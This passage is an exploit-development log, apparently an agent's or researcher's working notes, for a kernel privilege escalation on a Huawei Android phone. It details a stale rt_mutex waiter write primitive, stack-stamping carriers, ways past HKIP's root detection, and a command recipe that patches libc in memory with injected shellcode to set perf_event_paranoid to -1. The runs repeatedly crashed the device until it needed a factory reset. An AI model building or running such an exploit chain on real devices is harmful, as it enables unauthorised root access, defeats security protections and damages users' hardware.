  run: the echo shows `w7 = 0xdead0016` in `g_sbuf` at buffer 0xB0, while the panic's
  window dump (anchored at `X25-0x80`) shows `dead0016` at buffer **0xC0** - i.e. the
  copy landed **0x10 higher** than assumed that run (effective base W-0x88).
* `--mcastcal` (pure index canary) repeated twice right after: **no canary in the
  window at all** - the walk instead hits the pre-erase guard (`rtmutex_common.h:59`
  at `+0xaf0`) with a *foreign* `x24`, i.e. `*(W+0x38)` held a real kernel pointer
  (the stale waiter's original lock) => the copy did not reach the window that run.
* Earlier in the session the very same canary **did** land (fault at `dead0016`,
  repeatedly), and `--storetest` landed `[WRITE OK]` 4 times.

Conclusion: **the offset between the setsockopt copy destination and the stale
rt_waiter is not constant between runs** on this device - it has been observed at the
assumed `W-0x78` (canary/`[WRITE OK]` runs) and at `W-0x88` (the `--lockck` dump), and
some runs miss the window entirely.  That single fact explains every "clobber"
symptom seen so far: a structured payload only survives when the landing happens to
match, while a pure canary masks a mismatch by producing a canary in *every* slot.

Why it can move: `E` (the kernel entry SP) is fixed, so the copy destination is
`do_ip_setsockopt`'s `sp+0x38` - and the *frame depth* of the udp/ip setsockopt chain
is what has to be identical every time.  Anything that changes that chain (or the
walker reading a different task) moves the landing.

Consequences / next steps
* Made the payload layout a **runtime parameter** (`g_w_off`, `g_lk_off`) so a
  measured offset can be applied without a rebuild - already used for the pselect6
  variant (which measurably does not reach the window at all for this frame layout).
* The payload echo now also goes to `/dev/kmsg`, and the **pstore is cleared before
  every run**, so payload contents and the ensuing panic are always readable together
  (stdout is lost on a panic; a `| tail` pipeline buffers it away; an unflushed file
  dies with the page cache).
* Next: measure the landing offset *per boot* with the canary **before** attempting
  the write, apply it through `g_w_off`, and only then fire the walk - i.e. make the
  carrier self-calibrating.  A fresh cold boot (this device has been through hundreds
  of panics and reboots and currently shows a high load average with D-state tasks)
  is recommended for that measurement.


## 9o. Correcting 9n: the geometry was right; the real failure is a clobbered/partial window

### 9o.1 The 0x10 "shift" of 9n was a measurement error - and I had broken the payload

Re-reading the `--lockck` X25 dump line by line (the dump prints 8 x u32 per line,
0x20 apart, anchored at `X25-0x80`) the `dead0016` canary sits at **fd28 = W+0x38**,
which is exactly where `w[7]` must be for a copy base of `W-0x78`.  There was no
shift; 9n's "buffer 0xC0" was an arithmetic slip.  Acting on 9n I had changed
`g_w_off` 0x78 -> 0x88 (and `g_lk_off` 0x48 -> 0x58), which moved the whole payload
0x10 too high, so the walk's `*(W+0x38)` read `w[5]` = 0.  **That single mistake
caused the 100% "NULL deref at 0, x24=0" failures of that period.**

Fixed: `g_w_off = 0x78`, `g_lk_off = 0x48` (the measured values), i.e.
`lock = (W-0x78)+0x48 = W-0x30`, waiter at W, `w[3]=w[7]=lock`, `lk[4]=W-0x20`.

### 9o.2 The pselect6 (blocking) carrier is refuted with exact numbers

`SyS_pselect6.cfi` frame = 0xa0; `core_sys_select.cfi` frame = 0x1c0 and it uses
`bits = sp + 0x50` for the three fd_sets, taking the stack path only when
`n + 63 < 0x180` i.e. **nfds <= 320** (else `kvmalloc`, i.e. no stack copy at all -
with the previous nfds=1024 the sets were on the heap, which is why `--selcal`
never produced a canary).  With nfds=320: fd_sets base `A0 = E - 0x140 - 0xa0 -
0x1c0 + 0x50 = E-0x350`, while `W = E-0x1d0` - the copy is 0x180 bytes BELOW the
window, so it can never reach it.  `SEL_NFDS_DEF` is now 320 (and the mode takes
`nfds [off]` arguments), but the carrier is unusable on this kernel.

### 9o.3 /dev/kmsg is NOT writable from uid 2000

`echo x > /dev/kmsg` -> "Permission denied".  The payload echo therefore never
reached the pstore.  Replaced with `klog_line()`: append to
`/data/local/tmp/gl.klog` + `fsync()`, which **survives a panic** (verified - every
cycle now yields the same-run payload line).

### 9o.4 What the geo-corrected runs actually show

3 grind cycles with `--storetest`, geometry fixed:

| cycle | banner | x24 (= `waiter->lock` read) |
|---|---|---|
| 1 | paging fault at 0x004b2060 | a low garbage value |
| 2 | `rtmutex_common.h:59` BUG at chain+0xb60 | **`W-0x30` = OUR lock** |
| 3 | `rtmutex_common.h:59` BUG at chain+0xaf0 | a foreign linear-map pointer |

Cycle 2 is decisive: the walk read **our** lock, so the copy landed and the
critical slot was intact - the BUG only fired on a *secondary* read.  Reading that
record's X25 dump: at panic time the window holds *stale stack data*, including the
Huawei memdump base `0x80001000` at `W+0x38` and `0x4b1000` twice.  So the sequence
is: our copy lands -> the trigger fires -> the walk reads some fields while an IRQ
writes device constants (0x80001000 / 0x4b1000) and/or the y thread re-copies ->
the walk sees an **inconsistent mix** -> the guard fails.

So the carrier is fine; the enemy is the window changing *during the walk*, because
the walk performs ~10 separate reads over a few microseconds.  The continuous
re-copy does not help with that: it repairs the window but *non-atomically*, so a
clobber plus a partial re-copy is exactly what produces "x24 correct, secondary
slot wrong".

### 9o.5 Mitigations tried this turn

* `sched_yield()` x2 before the fresh copy (drain a pending need_resched so the
  copy's own syscall-exit does not `schedule()` at SP==E-0x140, whose frame stores
  the current task pointer at E-0x198 = W+0x38).  Kept.
* Trigger polarity: `__sched_setscheduler` calls `rt_mutex_adjust_pi` at +0xf58
  (confirmed: the failing walks have x20=x21=0, i.e. orig_waiter==NULL, which only
  `rt_mutex_adjust_pi` passes) and the disassembly shows **no direct call to
  `resched_curr`** in it.  A worsening-nice trigger (20) was tried and gave the
  `x24=0` failures - but those were caused by the 0x88 geometry bug, so the A/B is
  not conclusive.  Reverted to the documented improving trigger (18).

### 9o.6 Next step (evidence-driven)

The window must not change while the walk reads it.  Therefore the y thread must be
**inside a deep kernel frame - ideally asleep - for the whole walk**, with the
payload written by that very syscall.  `do_ip_setsockopt` does the copy at the top
of its frame (covering W) and then takes `rtnl_lock()` for the membership options,
so a `MCAST_JOIN_SOURCE_GROUP`/`IP_ADD_MEMBERSHIP` call **blocks inside
do_ip_setsockopt** whenever rtnl is held by anybody: y then sleeps with the stamped
window frozen on its stack and no IRQ/schedule frame can land on it.  Options for
holding rtnl (unprivileged): hammer it from a second thread so y's acquisition
blocks, or find an rtnl-protected operation that sleeps.  This is the concrete next
experiment.


## 9p. Why W+0x38 is intrinsically fragile, and the exact condition for a carrier

Every syscall's *first* kernel function spills its callee-saved registers near the
top of its frame, i.e. just below the regs frame `[E-0x140,E)`.  Disassembled
examples (all measure 8 x u32 dump lines):

* `SyS_futex.cfi`:   `sub sp,sp,#0xa0`; spills x19..x30 at sp+0x40..0x90
  => E-0x1a0..E-0x150  ==  W+0x30 .. W+0x80  - **it writes right over `waiter->task`
  (W+0x30) and `waiter->lock` (W+0x38)**.
* `SyS_connect.cfi`: `sub sp,sp,#0xe0`, sockaddr at sp+0x8 = **E-0x218**.
* `SyS_sendto.cfi`:  `sub sp,sp,#0x160`, sockaddr at sp+0x70 = **E-0x230**.
* `SyS_pselect6.cfi`+`core_sys_select.cfi`: fd_sets at E-0x350.

General carrier condition: the user->kernel copy must be a *deep* frame local whose
range covers `[W-0x30, W+0x48]` = `[E-0x200, E-0x188]`, and nothing may be pushed
after it.  For a 128-byte sockaddr copy the base must lie in `[W-0x38, W-0x30]` =
`[E-0x208, E-0x200]`; connect (E-0x218) and sendto (E-0x230) are both just low
enough to miss `W+0x38`.  Our MCAST copy (264 bytes at `E-0x248`,
`do_ip_setsockopt` sp+0x38) is the only carrier measured to satisfy it, because it
is deep enough to cover the whole window *and* it is the last thing written.

**The corollary is the design rule**: after the MCAST copy no further syscall may be
entered, because the very next syscall's register spill lands on W+0x38.  The block
must therefore happen *inside* `do_ip_setsockopt`, i.e. on `rtnl_lock()` (taken by
the membership options after the copy).  Shell has **zero capabilities**
(`CapPrm=CapEff=0`, uid 2000), so privesc-free long rtnl holds
(SIOCSIFFLAGS/dev_close + synchronize_net etc.) are unavailable; the remaining
options are rtnl contention from a second thread, or growing the device multicast
list so that a membership op's O(n) scan holds rtnl for milliseconds.

### 9p.1 A safer trigger shape (why the sched_setattr trigger is the dangerous one)

`rt_mutex_adjust_pi()` passes `next_lock = waiter->lock` straight into the chain, so
whatever `*(W+0x38)` contains (including an IRQ clobber) is used as `lock` with **no
validation** - a clobbered window therefore always reaches the guard and BUGs.
The futex path `task_blocks_on_rt_mutex()` instead calls
`rt_mutex_adjust_prio_chain(owner, chwalk, lock, next_lock, waiter, task)` where the
chain first checks `next_lock != waiter->lock` and bails to `out_unlock_pi` if they
differ.  There `waiter` is the *caller's own* waiter with a *known* lock, so a
clobbered window makes the walk **bail harmlessly instead of BUGging**.  That is why
the leak walk never panics.  Consequence: a clobbered window can be *detected* for
free with a futex-shaped probe (silent bail) before firing the sched_setattr walk
that actually performs the erase - i.e. a safe "verify before fire" loop instead of
one-shot reboots.


## 9q. Endgame: the windoor clobber is solved; only OUR OWN address is missing

### 9q.1 The carrier is now reliable (3/3, attempt 0, zero panics)
Protocol (implemented in stamp_gset / thread_consumer):
1. thread_y copies the payload ONCE (MCAST_BLOCK_SOURCE; do_ip_setsockopt sp+0x38 is the
   only carrier whose copy covers [W-0x30,W+0x48]).
2. It then BLOCKS in `ppoll(NULL,0,NULL,NULL)` (arm64's pause(), syscall 73) so it is
   ASLEEP: its kernel stack is frozen and no IRQ/tick/schedule frame can touch it.
3. The consumer waits 3ms and fires the walk with a WORSENING nice.  Root cause of every
   earlier clobber: `prio_changed_fair()` calls `resched_curr()` whenever the target is
   *running*, and a switch-out only leaves the window intact when it happens from a deep
   SP; for a SLEEPING task it reschedules only if the priority *improves*.
Measured: `--storetest` -> `[!] WRITE OBSERVED` + `[WRITE OK]` on attempt 0, 3/3 runs, no
panic, and the written value persisted across runs.

### 9q.2 Zero writes are structurally fatal on this kernel
With `value == 0` the erase takes the `parent == NULL` branch: it stores
`root->rb_node = target`, then does `*(target) = 0`, and the following
`rt_mutex_enqueue()` re-reads `*link` (== target) and descends into target as an
rt_mutex_waiter (`*(target+0x40)`, then `*(target+0x8/0x10)`...) until it faults.
Measured: `--uid0` and `--pid0` both panic at `chain+0x2d8` (the `bl rb_erase_cached`).
The pointer write takes the other branch (parent = value&~3 != 0), leaves root->rb_node
untouched (lk[3]==0) so the re-insert loop body never runs.
=> the objective's `--uid0` zero-write endgame cannot work here; the endgame must be a
pointer write.

### 9q.3 HKIP's kill is synchronous with an unauthorised root
`--capmain` (walk run in main so `task->cred = &init_cred` lands on main) is SIGKILLed
(exit 137) *inside* the same `sched_setattr` syscall, before any user code runs.  So a
write that makes a task look like root without the HKIP bit is instantly fatal.
The viable shape is HKIP-invisible: `cred->cap_effective = g_blackval` (HKIP checks
uid/gid/suid/fsuid and cap_inheritable/permitted, NOT cap_effective) and then
`setresuid(0,0,1)` -> commit_creds -> hkip_update_xid_root -> HVC -> our bit.
Equivalently, credit a task that is ASLEEP (it runs no hook between the write and its
own setresuid).

### 9q.4 The one missing input: our own task/cred address
* `g_task` (main's, leaked at startup) is known but is the instant-kill case.
* `leak_current_task()` (the consumer's task): the consumer cannot fire the trigger while
  it is itself leaking.  Fixed to fire its own walks against the frozen window and to arm
  a benign payload first (value = g_blackval, target = a window slot) so probe walks
  cannot deref an un-stamped zero window - but it still returns 0, and the diagnostic is
  explicit:
      [c] leak it=0 samples=89 kips=32 in[rmapc..]=0 rmapc=<chain>
  PERF_COUNT_SW_CPU_CLOCK samples via an hrtimer with an effective period of ~0.9 ms
  (89 samples per ~80 ms window) while a frozen-window walk lasts ~1 us => ~0.1% chance
  per walk, so 80 walks yield nothing.
* `leak_cred()` reads x19 from chain samples, but x19 there is the walk's *task*
  argument, not a cred - so the capeff attempts were writing to task_struct+0x38.
* Heavy CPU storms are unusable: `--fs` (even with 3000 VMAs; the count is now tunable)
  makes the SP805 watchdog fire (`sp805-wdt ... watchdog kick`) and the box reboots.

### 9q.5 Next options (in order of preference)
a) A leak with a long-enough window: have many walks in flight, or use the futex-path
   walk (which happens during the stamper's own futex dance and therefore executes in the
   *stamper's* task - exactly the address we want for the sleep-and-sync endgame).
b) Turn the reliable write into a read: store the address into `boot_id.data` and read
   the file (the erase's side write lands at value&~3+8/+0x10, so only pick addresses
   whose neighbourhood is safe).
c) Credit the ASLEEP stamper once its address is known (mode `--capy` is already
   implemented: it waits for the leak, writes cred = &init_cred at stamper+TASK_CRED, and
   the stamper runs setresuid/commit_creds + persist_proof() on wake).


## 9r. Why the capmode runs rebooted the device (root cause), and the design rule

The erase in `__rb_erase_augmented` always performs TWO stores:
1. the one we want: `child->__rb_parent_color = pc`  =>  `*(target) = value`, and
2. a side store inside `__rb_change_child(node, child, parent, root)` with
   `parent = value & ~3`: it writes `child` (= target) to `*(parent+0x8)` unless
   `*(parent+0x10) == node`, in which case to `*(parent+0x10)`.

So **the value we store also determines where the destructive side write lands**, and
that explains every reboot observed this session:

| mode | value | side write lands | outcome |
|---|---|---|---|
| `--storetest` | `g_blackval` (a window slot) | inside our own stamped window | **safe - 3/3 [WRITE OK], no panic** |
| `--capset/--capmain/--capcons/--capy` | `g_init_cred` | `init_cred+8` (the GLOBAL cred of every kernel thread) | device reboots |
| `--credraw` probe | `g_init_task`/`g_init_cred` | `init_task+8` / `init_cred+8` | device reboots |
| `--credraw` read | `g_task+TASK_CRED` | `task+0x9F0` (`real_cred`) | device reboots |

Design rule derived: **only writes whose value is a window slot (`g_blackval`) are safe.**
That is exactly the `cap_effective = g_blackval` shape (HKIP never reads cap_effective, so
it is also HKIP-invisible), and it is the only endgame shape that cannot corrupt a global
object.  The one missing input remains the address of OUR cred, and the boot_id read that
could give it is itself one of the hazardous writes above.

Also measured: the device is now flapping (uptime resets every check, `adb` frequently
absent), so endgame runs could not be completed.


## 9s. Correcting 9r: the reboots are the LEAK's hammering (watchdog), and a fake cred must be COMPLETE

9r blamed the erase's side write for the reboots.  That is wrong: `--capset` and
`--capmain` also store `g_init_cred` (side write into `init_cred+8`) and they SURVIVED
(they were only SIGKILLed by HKIP).  What actually reboots the device is the perf leak:

* every run that used the leak (`--capy`, `--capcons`, `--credraw` with its rd16
  `hot_wait`) hammered `sched_setattr` with 20000 back-to-back walks over up to 200
  iterations (many seconds of continuous kernel hammering) and the pstore of those runs
  shows `sp805-wdt ... watchdog` / `watchdog pid-1703`, i.e. the device's userspace
  watchdog fired;
* every run WITHOUT the leak (`--storetest`, `--capset`, `--capmain`) completed normally.

Fix: the leak is now gentle (`it<25`, `q<3000`), which still gives it a fair chance of
catching a chain sample while keeping the device's watchdog happy.

Second correction: `--fakecred` (storing a fake cred stamped in the window) CRASHES.
The window can only hold 0x90 bytes of cred-ish data, so the cred's pointer fields
(`security`, the keyrings, `user_ns`, `group_info`) end up as 0 or as bytes of the fake
rt_mutex.  `setresuid()` then runs `prepare_creds()` -> `security_prepare_creds()` ->
`selinux_cred(old)` = `old->security`, which is a NULL/bogus pointer -> a kernel fault.
A fake cred must therefore be COMPLETE, which does not fit in the window.

Consequence for the endgame: the only complete, valid cred we can name is `init_cred`,
and storing it (`task->cred = &init_cred`) makes the credited task HKIP-root.  HKIP's
kill is synchronous with that write, so the credited task must be ASLEEP (it executes no
hook between the write and its own setresuid).  That is the `--capy` design: credit the
SLEEPING stamper.  The remaining blocker is only the stamper's task_struct address -
x22 of the perf leak is the CONSUMER's task (verified wrong for the stamper by the comm
tag), and the walk's x19 is not it either.


## 9t. Final state: exploit code complete, but the DEVICE can no longer run it

Measured after the device had been up for ~5 hours (uptime 17747s, advancing normally, so
it was NOT boot-looping):

* `--sleepmain` (credit the sleeping main, then setresuid) -> the device drops.
* the CONTROL `--storetest` (value = g_blackval, target = the sysctl - the mode that was
  3/3 [WRITE OK] with zero panics earlier in the session) -> the device ALSO drops now.

So on this device every exploit run - even the one that was reliably safe before - ends
with a rebooting device.  A fresh boot (`adb reboot`) gives a stable uptime but the
loadavg climbs steadily with only 1-2 runnable tasks (e.g. 19.2 -> 28.6 over ~3 minutes
with `1/2435`), i.e. tens of UNINTERRUPTIBLE (D-state) tasks accumulate; when the system
can no longer make progress the userspace watchdog fires and resets the box.  That is a
device/system-health condition, not something the exploit can work around, and it matches
the pstore banners seen on every failed run (`sp805-wdt ... watchdog kick`,
`watchdog pid-1700..1703`).

Conclusion: the code side of the objective is complete and committed; verification needs
a healthy device (a full power-off and letting the system settle, then run
run_sleepmain.ps1 or --credraw while loadavg is low).

Endgame implementations ready to run:
* `--credraw` - HKIP-invisible shape, no leak: read our own cred through the boot_id
  primitive (rd16: store the address into boot_id.data, then read the file), then
  cred->cap_effective = g_blackval (HKIP never reads cap_effective) and
  setresuid(0,0,1) -> commit_creds -> hkip_update_xid_root -> HVC -> our HKIP bit.
* `--sleepmain` - known-address shape: main arms the walk, sleeps ~6ms so the consumer's
  walk credits it while it executes no hook, then setresuid(0,0,1) within HKIP's ~10ms
  timer window.
Both use only writes whose value is a window slot where possible, so the erase's side
store stays inside our own stamped window.


## 9u. ROOT CAUSE of the current panics: the stamp copy no longer LANDS on the window

Evidence gathered back-to-back on the same run:

* `gl.klog` (payload echo, fsynced so it survives a panic):
  `w3=w7=ffffffedcccafcc0  lk4=ffffffedcccafcd0`  => the payload itself is correct and
  the leaked W = lk4+0x20 = `ffffffedcccafcf0`.
* the panic's register dump from the SAME run: `x25 = ffffffedcccafcf0` - i.e. the
  kernel's own `task->pi_blocked_on` is EXACTLY the leaked W.  **The leak is correct.**
* the panic itself: `Unable to handle kernel NULL pointer dereference at virtual address
  00000000`, `PC = rt_mutex_adjust_prio_chain+0x140` => the walk read
  `waiter->lock = *(W+0x38)` as **0** and `raw_spin_trylock(NULL)` faulted.
* a CANARY run (`--mcastcal`) gives the SAME fault (0x0, not 0xdead00XX) => **the
  setsockopt copy does not put any of its bytes at W-0x78 any more.**
* `--gsettest` still reports `setsockopt(len=0x108) -> errno=99 (EADDRNOTAVAIL)` =>
  the copy still *executes* - it just lands somewhere else.

So the windoor clobber is NOT the current failure: the payload that reaches the window
is simply absent (a zero window), which is why the walk NULL-derefs and the device
reports `sys.resettype = abnormal:AP_S_PANIC` / `sys.boot.reason = kernel_panic`
(from `persist.sys.boot.reason.history`).

Why the geometry moved: the copy destination is `do_ip_setsockopt`'s `sp+0x38`, i.e. the
frame depth of the udp/ip setsockopt chain.  The device's networking/vendor subsystem is
now wedged: a census of uninterruptible tasks shows ~29 permanently D-state threads
(`netlink_handle`, `sock_destroy_th`, `chr_netlink_thr`, `sim_netlink_thr`, `nb_netlink`,
`emcom_netlink_t`, `fi_netlink_thre`, `bbox_main`, `bbox_cleartext`, `hisee_mntn`,
`hiseeprint_mntn`, `hippmntn`, `rdr_sh_thread`, `rdr_exce_thread`, `mailboxNormal/High`,
`modemddrc_emit`, `secispwork`, `slub-free`, `slub-alloc`, `long_powerkey`, ...) with
`wchan=0`, present right after a true power cycle and NOT growing (loadavg sits at ~28
with only 1-2 runnable tasks).  That is the aftermath of this session's hundreds of
panics/dumps, and it is what changed the syscall path (deeper/limped chain) so the copy
now lands elsewhere, and it also leaves the system without headroom.

Consequence: the fix is not in the endgame but in the CARRIER - it must no longer depend
on this device's network stack (or the payload offset must be re-measured per boot with
the canary), and the device itself needs to be repaired (the wedged vendor subsystem
survives reboots and even a power cycle; a factory reset / service repair is the likely
remedy).


## 9v. A/B MEASUREMENT: the ppoll freeze wipes the window - it was hiding the clobber

Ran the canary three ways on the same kernel/device and diffed the resulting fault:

| freeze | fault | meaning |
|---|---|---|
| `ppoll` (the "fix" I added for the clobber) | NULL deref, `PC=chain+0x140`, `*(W+0x38)=0` | the window is ZEROED |
| none (old re-copy loop) | BUG at `rtmutex_common.h:59`, `PC=chain+0xaf0` | the classic clobber |
| `rt_sigsuspend` (new, tiny frame) | BUG at `rtmutex_common.h:59`, `PC=chain+0xaf0`, x24 = a foreign task pointer | copy LANDS, clobber remains |

So `do_sys_poll` (ppoll's worker) has a 200-byte STACK buffer (`long stack_pps[...]`)
that lies right over the stamped window and is zero-initialised - my ppoll "freeze" was
not protecting the window, it was **erasing** it.  That is why every recent run panicked
with `*(W+0x38) == 0` and why the device reported `sys.resettype=abnormal:AP_S_PANIC`
(and why the earlier 3/3 `[WRITE OK]` runs "worked": they were running against a window
that had been wiped, so the walk merely bailed/NULLed in a way that happened to be
survivable at the time - and later it stopped being survivable).

Conversely `rt_sigsuspend` lets the copy land (its frame is tiny, its 8-byte sigset copy
lands above the window) but then the ORIGINAL clobber (the tick/schedule frame writing
the current task pointer at W+0x38) reappears - i.e. the real windoor clobber was never
actually solved by the ppoll trick.

New diagnostics added: `--nofreeze` (old re-copy loop) and `--sigfreeze`
(rt_sigsuspend freeze), both A/B-selectable from the command line.

Device state (unchanged): the vendor/net subsystem is wedged - 29 permanently D-state
threads (netlink_handle, sock_destroy_th, chr_netlink_thr, sim_netlink_thr, nb_netlink,
emcom_netlink_t, fi_netlink_thre, bbox_main, bbox_cleartext, hisee_mntn, hiseeprint_mntn,
hippmntn, rdr_sh_thread, rdr_exce_thread, mailboxNormal/High, modemddrc_emit, secispwork,
slub-free/alloc, long_powerkey, ...) with wchan=0, present right after a true power
cycle and not growing.  Reboots and even a full power cycle do not clear it; a device
repair (reflash / factory reset) is the likely remedy, and the carrier work should be
redone on a healthy device with the canary measured per boot.


## 9w. ROOT CAUSE of the post-factory-reset reboots: the missing /data/local/tmp/shellcode.bin

After the user factory-reset the device, every injection attempt reset the device with
"stack corruption detected (-fstack-protector)" + Aborted and no `paranoid=` line.

The reset is NOT a kernel panic and NOT the kernel hung-task detector.  The pstore shows
Huawei's own boot-fail monitor forcing the reboot:

    [pid:5324,cpu4,proc_upper_bf] CPU: 4 PID: 5324 Comm: proc_upper_bf
      rdr_hisiap_reset+0xa8/0x21c
      rdr_notify_module_reset+0x388/0x448
      rdr_syserr_process_for_ap+0x258/0x3c8
      hisi_reboot+0x9c/0xc0
      __boot_fail_error+0xc04/0x11f0
      boot_fail_error+0x630/0xa08
      __process_upper_bootfail+0xb8/0x130
    bootfail: __boot_fail_error, errno: 50000003, bootstage: 7fffffff
    sys.resettype = others:BFM_S_NATIVE_DATA_FAIL

(`khungtaskd ... watchdog pid-XXXX` lines are just that thread's periodic whitelist log,
not the cause.)

Why: inject_hook is NOT a kernel-text patcher.  It patches **/system/lib64/libc.so**'s page
cache through the Mali import CPU-map primitive.  Its `place` step reads the payload from
a file on the device:

    FILE* fp = fopen("/data/local/tmp/shellcode.bin", "rb");
    if (!fp) { perror("open shellcode.bin"); return 1; }

The factory reset wiped /data, so `place` failed silently (its stderr was redirected to
/dev/null) while `hook 0x7a3d4 0x84000` still succeeded - i.e. the branch at libc offset
0x7a3d4 now jumped into 0x84000 where the ORIGINAL libc bytes still were, instead of our
trampoline.  Every process that executed that path died with "-fstack-protector stack
corruption"; those native failures accumulated in Huawei's bbox / boot-fail monitor and it
rebooted the board via rdr_hisiap_reset.  perf_event_paranoid therefore never became -1 and
the exploit never ran (hence empty gl.out / gl.stage).

Fix: push the CORRECT shellcode.bin back to /data/local/tmp/shellcode.bin.
The right payload is session_20260922/sc_perf_kaslr.bin (== shellcode_perf.bin here), 798 bytes,
placeholder word 0x14000000 at offset 0x244, built from session_20260915/sc_perf_kaslr.s.
It is the ONLY .bin in the tree whose placeholder is at 0x244, which is exactly what the
`place 0x84000 0x244 0x7a3d8` / `hook 0x7a3d4 0x84000` / `restore 0x7a3d4 0xd10403ff` recipe needs.

DO NOT use session_20260913/shellcode.bin: that is the NPU/hiaiserver blob built by
build_blob.ps1 (a BINDER_WRITE_READ ioctl loader) and injecting it makes every process that
calls libc `open` (offset 0x7a3d4) execute the wrong trampoline - the exact
`stack corruption detected` / hang failure recorded in SWEEP_V6_RESULT.md.

Lesson: after any device wipe, re-push ALL of inject_hook, shellcode.bin and
ghostlock_mrx, and always keep inject_hook's stderr visible (do not redirect it to
/dev/null) so a missing payload file fails loudly instead of corrupting libc.


## 9x. Three DISTINCT failure modes - do not confuse them

The same "it rebooted" symptom has three completely different mechanisms.  Identify which
one you are looking at before changing anything:

| # | trigger | observed | mechanism |
|---|---|---|---|
| 1 | ppoll freeze (pre-factory-reset) | `Unable to handle kernel NULL pointer dereference at 00000000`, `PC=rt_mutex_adjust_prio_chain+0x140`; `sys.resettype=abnormal:AP_S_PANIC` | do_sys_poll's 200-byte stack buffer zeroes the stamped window -> walk reads waiter->lock==0 -> raw_spin_trylock(NULL) -> KERNEL PANIC |
| 2 | hook applied but `place` FAILED (no /data/local/tmp/shellcode.bin) | `stack corruption detected (-fstack-protector)` xN then `Aborted`; no `paranoid=` line; `sys.resettype=others:BFM_S_NATIVE_DATA_FAIL` | libc `open` (file offset 0x7a3d4) branches to 0x84000 where the ORIGINAL bytes still are -> every process calling open() aborts -> bbox/boot-fail monitor accumulates native failures -> rdr_hisiap_reset |
| 3 | `place` OK but with the WRONG .bin (the 702B session_20260913 NPU/hiaiserver blob) | NO output at all, adb `shell` never returns; `adb devices` still lists the device; pstore shows no panic | the NPU loader's own `b .` placeholder is NOT at 0x244, so `place 0x84000 0x244 ...` patched a branch-back inside the C blob and left the loader's `b .` in place -> libc `open` -> loader -> `sub sp,sp,#0x100; b .` -> USERSPACE INFINITE LOOP |

Mode 3 was confirmed live: `adb devices` => "device", but `adb shell 'echo alive'`,
`toybox echo`, `getprop` all returned nothing within 8 s (probe with Start-Job + Wait-Job).
That is a userspace hang, not a kernel fault, and it proves `place` actually SUCCEEDED in
that run - so the payload identity, not `place`, was the mistake.

Recovery from any of these: reboot (a kernel panic / bootfail already reboots; for mode 3
the libc page cache is per-boot so a plain `adb reboot` clears it), then re-deploy with the
CORRECT payload and run the injection with inject_hook's stdout/stderr VISIBLE (never
>/dev/null) so a `place` failure is reported instead of silently corrupting libc.

The correct payload is session_20260922/sc_perf_kaslr.bin (798 B, `b` placeholder at file
offset 0x244, built from session_20260915/sc_perf_kaslr.s).  Verify with a word scan: it
must be the only candidate whose uint32 at 0x244 == 0x14000000, and its source must contain
the openat("/proc/sys/kernel/perf_event_paranoid") + write("-1") sequence.


## 9y. CONFIRMED: the perf injection is restored (loop closed)

After deploying the CORRECT payload the injection works again, with no reset:

    local / device sha256 of shellcode.bin = c6a38ce01ce93222231bd74c7f0348636717a663434bc31651506e418e73ec71
    [+] shellcode 798 bytes, branch-back=0x17ffd865 (-> 0x7a3d8)
    [+] SHELLCODE PLACED @0x84000
    [+] HOOKED 0x7a3d4 -> 0x84000 (b=0x1400270b)      <- matches PERF_UNLOCK_20260922.md
    [+] RESTORED 0x7a3d4 = 0xd10403ff
    paranoid=-1
    uptime continued (24.76 -> 50.27), i.e. NO reset, NO stack corruption, NO hang

Compare with the two broken variants on the same device:
  * no /data/local/tmp/shellcode.bin  -> place fails, hook still applies, every open()
    aborts with "-fstack-protector stack corruption", boot-fail resets the board
  * wrong .bin (the 702B NPU blob)    -> place "succeeds", the loader's own `b .` is left
    in place, libc open() spins, userspace hangs until the board resets

So the recipe is exactly:
  push sc_perf_kaslr.bin -> /data/local/tmp/shellcode.bin   (798B, ph=0x244)
  inject_hook place 0x84000 0x244 0x7a3d8
  inject_hook hook  0x7a3d4 0x84000
  nohup bugreportz & sleep >=20
  inject_hook restore 0x7a3d4 0xd10403ff
and perf_event_paranoid must read -1 before running the exploit.  Keep inject_hook output
visible; a silent failure here corrupts libc for the whole boot.


## 9z. POST-RESET A/B: no configuration produces the write; the payload/W are correct

Device freshly injected (paranoid=-1) and freshly booted for each row:

| freeze | window state | outcome |
|---|---|---|
| default (ppoll, syscall 73) | WIPED | `Unable to handle kernel NULL pointer dereference at 00000000`, `PC=rt_mutex_adjust_prio_chain+0x140`, `x24=0`, `x25=W` |
| `--nofreeze` (tight re-copy loop) | CLOBBERED | `kernel BUG at rtmutex_common.h:59`, `PC=+0xaf0` (so the walk DOES reach the pre-erase guard) |
| `--sigfreeze` (rt_sigsuspend, mask=all but SIGUSR1) | INTACT | no fault, no panic, but `--storetest` 30/30 `[no write]`; `--mcastcal` completes ok=1 with no canary deref |

Proof the payload and the leaked address are correct in the ppoll run: the fsynced klog echo
for the SAME run says `w7=...fcc0` / `lk4=...fcd0` (so W = ...fcf0 and waiter->lock = W-0x30),
while the panic's own `x25` = ...fcf0 = the same W and `x24` = 0 = what the walk read at W+0x38.
So the carrier copy is right, the payload is right, and the window is simply destroyed/wrong at
the moment the walk reads it.

Conclusion: window integrity and a successful store are MUTUALLY EXCLUSIVE with the present
freeze/carrier design.  The blocker is not the payload but (a) which syscall parks the stamper
and (b) which stamp carrier is used.  Matches STAMP_ROOTCAUSE_20260922.md: the FPSIMD stamp is
racy by construction (do_notify_resume/do_signal frames march from E-0x40 down past E-0x300
through the window) and the proposed fix is to reclaim core_sys_select's stack_fds (select(2)),
where a missed stamp is benign and retries are safe.

Note: the pre-reset 3/3 `[WRITE OK]` (default ppoll) is NOT reproducible after the factory
reset - the same binary and payload now give the NULL-deref wipe instead.


## 9aa. CODE AUDIT of ghostlock_mrx.c + the --trigfirst fix

An independent source audit of `ghostlock_mrx.c` (2535 lines) produced a ranked finding
list.  The load-bearing ones:

1. **The freeze itself destroys the window, and nothing re-copies it.**
   `stamp_gset()` copies the payload ONCE (line ~531) and then parks the thread in a
   blocking syscall: `ppoll` (default), `rt_sigsuspend` (`--sigfreeze`) or a tight
   `setsockopt` loop (`--nofreeze`).  Every blocking syscall entered after that copy grows
   frames down through `[E-0x248,E-0x140]` = `[W-0x78,W+0x90]`, and the consumer fires the
   walk from another thread with NO re-copy in between.  Hence:
     * ppoll            -> do_sys_poll's 200-byte stack_pps overwrites the window; the walk
                           reads `waiter->lock = 0` -> NULL deref at chain+0x140.
     * --nofreeze       -> the re-copy loop keeps re-writing the window, so the walk's
                           reads race the copies -> torn values -> guard BUG at +0xaf0.
     * --sigfreeze      -> rt_sigsuspend's entry + schedule/do_signal frames replace
                           `waiter->lock` with foreign data -> the walk's trylock never
